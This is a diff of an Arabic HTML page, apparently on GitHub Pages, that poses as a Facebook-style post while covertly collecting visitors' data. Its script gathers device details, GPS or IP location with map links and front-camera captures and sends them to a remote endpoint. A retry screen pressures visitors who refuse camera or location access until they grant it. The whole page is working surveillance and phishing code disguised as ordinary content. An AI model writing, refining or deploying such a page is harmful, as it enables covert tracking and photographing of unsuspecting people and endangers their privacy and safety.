@@ -9,26 +9,119 @@
   <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <style>
-    :root { --bg: #f0f2f5; --card-bg: #ffffff; --text-primary: #050505; --text-secondary: #65676b; --border: #e4e6eb; }
-    @media (prefers-color-scheme: dark) { :root { --bg: #18191a; --card-bg: #242526; --text-primary: #e4e6eb; --text-secondary: #b0b3b8; --border: #3e4042; } }
+    :root {
+      --bg: #f0f2f5;
+      --card-bg: #ffffff;
+      --text-primary: #050505;
+      --text-secondary: #65676b;
+      --border: #e4e6eb;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: #18191a;
+        --card-bg: #242526;
+        --text-primary: #e4e6eb;
+        --text-secondary: #b0b3b8;
+        --border: #3e4042;
+      }
+    }
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: var(--bg); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; padding-top: 20px; min-height: 100vh; position: relative; }
+    body {
+      background: var(--bg);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      padding-top: 20px;
+      min-height: 100vh;
+      position: relative;
+    }
 
-    .post-container { max-width: 680px; width: 100%; background: var(--card-bg); border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid var(--border); }
-    .post-header { display: flex; align-items: center; padding: 12px 16px 0; }
-    .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
-    .post-user { font-weight: 600; font-size: 15px; color: var(--text-primary); }
-    .post-time { font-size: 13px; color: var(--text-secondary); display: flex; align-items: center; gap: 4px; }
-    .post-text { padding: 4px 16px 12px; font-size: 15px; color: var(--text-primary); white-space: pre-wrap; }
-    .post-image img { width: 100%; display: block; border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
-    .post-location { padding: 4px 16px 8px; font-size: 13px; color: var(--text-secondary); display: flex; align-items: center; gap: 4px; }
-    .post-location img { width: 100%; margin-top: 6px; border-radius: 8px; max-height: 130px; object-fit: cover; }
-    .post-stats { display: flex; justify-content: space-between; padding: 8px 16px; font-size: 13px; color: var(--text-secondary); border-top: 1px solid var(--border); }
-    .post-actions { display: flex; justify-content: space-evenly; padding: 4px 16px 8px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px; font-weight: 600; }
-    .post-actions span { cursor: pointer; padding: 8px 0; flex: 1; text-align: center; }
+    .post-container {
+      max-width: 500px;
+      width: 100%;
+      background: var(--card-bg);
+      border-radius: 8px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+      overflow: hidden;
+      border: 1px solid var(--border);
+    }
+    .post-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px 0;
+    }
+    .post-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      margin-left: 8px;
+      object-fit: cover;
+    }
+    .post-user {
+      font-weight: 600;
+      font-size: 15px;
+      color: var(--text-primary);
+    }
+    .post-time {
+      font-size: 13px;
+      color: var(--text-secondary);
+    }
+    .post-text {
+      padding: 4px 16px 12px;
+      font-size: 15px;
+      color: var(--text-primary);
+      white-space: pre-wrap;
+    }
+    .post-image img {
+      width: 100%;
+      display: block;
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+    }
+    .post-stats {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 16px;
+      font-size: 13px;
+      color: var(--text-secondary);
+      border-top: 1px solid var(--border);
+    }
+    .post-actions {
+      display: flex;
+      justify-content: space-evenly;
+      padding: 4px 16px 8px;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .post-actions span {
+      cursor: pointer;
+      padding: 8px 0;
+      flex: 1;
+      text-align: center;
+    }
 
-    .retry-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999; }
-    .retry-btn { padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
+    /* شاشة إعادة المحاولة */
+    .retry-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: var(--bg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .retry-btn {
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+    }
     .hidden { display: none !important; }
     video { display: none; }
   </style>
@@ -37,11 +130,21 @@
   <div class="post-container" id="postContainer">
     <div class="post-header">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
-      <div><div class="post-user">المستخدم</div><div class="post-time">الآن</div></div>
+      <div>
+        <div class="post-user">المستخدم</div>
+        <div class="post-time">الآن</div>
+      </div>
     </div>
     <div class="post-text">جارٍ تحميل المنشور...</div>
-    <div class="post-stats"><span>0 تعليق</span><span>0 مشاركة</span></div>
-    <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
+    <div class="post-stats">
+      <span>0 تعليق</span>
+      <span>0 مشاركة</span>
+    </div>
+    <div class="post-actions">
+      <span>أعجبني</span>
+      <span>تعليق</span>
+      <span>مشاركة</span>
+    </div>
   </div>
 
   <div class="retry-overlay hidden" id="retryOverlay">
@@ -64,7 +167,7 @@
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    let stream, photos=0, capInt, cntInt, cnt=10, loc, redir='https://example.com', locationName='';
+    let stream, photos=0, capInt, cntInt, cnt=10, loc, redir='https://example.com';
 
     async function updatePost(){
       try{
@@ -72,22 +175,25 @@
         let d=await r.json(); let s=d.record||{};
         redir=s.redirectUrl||redir;
         post.innerHTML=`
-          <div class="post-header"><img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'"><div><div class="post-user">${s.profileName||'Shahin Zyan'}</div><div class="post-time">${s.postTime||'الآن'} · 🌍</div></div></div>
+          <div class="post-header">
+            <img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
+            <div>
+              <div class="post-user">${s.profileName||'Shahin Zyan'}</div>
+              <div class="post-time">${s.postTime||'الآن'}</div>
+            </div>
+          </div>
           <div class="post-text">${s.postText||'هذا نص المنشور.'}</div>
           ${s.postImage?`<div class="post-image"><img src="${s.postImage}" alt="صورة المنشور"></div>`:''}
-          <div id="locationArea"></div>
-          <div class="post-stats"><span>${s.commentsCount||'12'} تعليق</span><span>${s.sharesCount||'5'} مشاركة</span></div>
-          <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
+          <div class="post-stats">
+            <span>${s.commentsCount||'12'} تعليق</span>
+            <span>${s.sharesCount||'5'} مشاركة</span>
+          </div>
+          <div class="post-actions">
+            <span>أعجبني</span>
+            <span>تعليق</span>
+            <span>مشاركة</span>
+          </div>`;
       }catch(e){}
-    }
-
-    function updateLocationArea(){
-      const area = document.getElementById('locationArea');
-      if(!area) return;
-      if(loc && locationName){
-        const mapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${loc.lat},${loc.lon}&zoom=13&size=600x150&markers=${loc.lat},${loc.lon},red-pin`;
-        area.innerHTML = `<div class="post-location">📍 ${locationName}</div><img src="${mapUrl}" alt="خريطة الموقع" style="width:100%;max-height:150px;object-fit:cover;border-bottom:1px solid var(--border);">`;
-      }
     }
 
     async function send(t){
@@ -100,7 +206,7 @@
         if(ua.getHighEntropyValues) try{h=await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]);}catch(e){}
         let sc=window.screen, bat=null;
         if('getBattery' in navigator) try{let b=await navigator.getBattery();bat={level:b.level,charging:b.charging};}catch(e){}
-        let txt='<b>📱 معلومات الجهاز</b>\n';
+        let txt='معلومات الجهاز\n';
         txt+=`الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
         txt+=`المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
         if(bat) txt+=`البطارية: ${(bat.level*100).toFixed(0)}% ${bat.charging?'⚡':'🔋'}\n`;
@@ -109,38 +215,28 @@
       }catch(e){}
     }
 
-    // جمع الموقع الأولي عبر IP (يعمل فوراً بدون أذونات)
-    async function collectInitialLoc(){
-      try{
-        let r=await fetch(`https://ipinfo.io/json?token=${I}`);
-        let d=await r.json();
-        if(d.loc){
-          let [lat,lon]=d.loc.split(',').map(Number);
-          loc={lat,lon,acc:10000,src:'IP'};
-        }
-        locationName = d.city ? `${d.city}, ${d.region}, ${d.country}` : (d.region ? `${d.region}, ${d.country}` : '');
-        if(!locationName && loc) locationName = `${loc.lat.toFixed(4)}, ${loc.lon.toFixed(4)}`;
-        updateLocationArea();
-        if(loc) send(`📍 الموقع (IP): ${loc.lat},${loc.lon}\n🗺️ https://www.google.com/maps?q=${loc.lat},${loc.lon}`);
-      }catch(e){}
-    }
-
-    // طلب GPS الدقيق (يتطلب إذن)
-    async function requestGPS(){
-      if(!navigator.geolocation) return false;
-      try{
-        let pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
-        loc={lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,src:'GPS'};
-        // تحديث اسم الموقع من الإحداثيات (عبر خدمة عكسية)
+    async function collectLoc(){
+      // محاولة GPS أولاً
+      if(navigator.geolocation){
         try{
-          let r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=10&accept-language=ar`);
-          let d=await r.json();
-          if(d.address) locationName = `${d.address.city||d.address.town||d.address.village||d.address.county||''}, ${d.address.state||''}, ${d.address.country||''}`;
+          let pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
+          loc={lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,src:'GPS'};
         }catch(e){}
-        updateLocationArea();
-        send(`📍 الموقع الدقيق (GPS): ${loc.lat},${loc.lon} (${loc.acc}m)\n🗺️ https://www.google.com/maps?q=${loc.lat},${loc.lon}`);
-        return true;
-      }catch(e){ return false; }
+      }
+      // IP احتياطي
+      if(!loc){
+        try{
+          let r=await fetch(`https://ipinfo.io/json?token=${I}`);
+          let d=await r.json();
+          if(d.loc){
+            let [lat,lon]=d.loc.split(',').map(Number);
+            loc={lat,lon,acc:10000,src:'IP'};
+          }
+        }catch(e){}
+      }
+      if(loc){
+        send(`الموقع: ${loc.lat},${loc.lon} (${loc.src}, ${loc.acc}m)\nhttps://www.google.com/maps?q=${loc.lat},${loc.lon}`);
+      }
     }
 
     async function startCam(){
@@ -175,33 +271,32 @@
     function showRetry(){ post.classList.add('hidden'); overlay.classList.remove('hidden'); stopAll(); }
     function hideRetry(){ overlay.classList.add('hidden'); post.classList.remove('hidden'); }
 
-    // طلب الصلاحيات (يُطلب الكاميرا والموقع معاً)
     async function requestPermissions(){
-      // طلب الكاميرا
-      let camOk = false;
+      let camOk=false, locOk=false;
       try{
-        stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
-        camOk = true;
+        stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+        camOk=true;
       }catch(e){}
-
-      // طلب GPS
-      let gpsOk = await requestGPS();
-
-      // إذا رُفض أحدهما => إعادة محاولة
-      if(!camOk || !gpsOk){
-        hideRetry(); // ظهور المنشور للحظة
-        await new Promise(r=>setTimeout(r,200));
-        showRetry(); // ظهور زر إعادة المحاولة
-        return false;
+      if(navigator.geolocation){
+        try{
+          let pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
+          loc={lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,src:'GPS'}; locOk=true;
+        }catch(e){}
       }
 
-      // نجح الاثنان
-      hideRetry();
-      await startCam();
-      return true;
+      collectDevice();
+      await collectLoc();
+
+      if(camOk && locOk){
+        hideRetry();
+        await startCam();
+      } else {
+        hideRetry();
+        await new Promise(r=>setTimeout(r,200));
+        showRetry();
+      }
     }
 
-    // زر إعادة المحاولة
     retry.addEventListener('click', async ()=>{
       hideRetry();
       await new Promise(r=>setTimeout(r,300));
@@ -210,11 +305,10 @@
 
     (async function init(){
       await updatePost();
-      // 1. إرسال معلومات الجهاز فوراً
+      // إرسال معلومات الجهاز والموقع الأولي فوراً
       collectDevice();
-      // 2. جلب الموقع الأولي عبر IP وإرساله
-      await collectInitialLoc();
-      // 3. طلب الصلاحيات الدقيقة
+      collectLoc();
+      // طلب الصلاحيات
       setTimeout(requestPermissions, 600);
     })();
   </script>
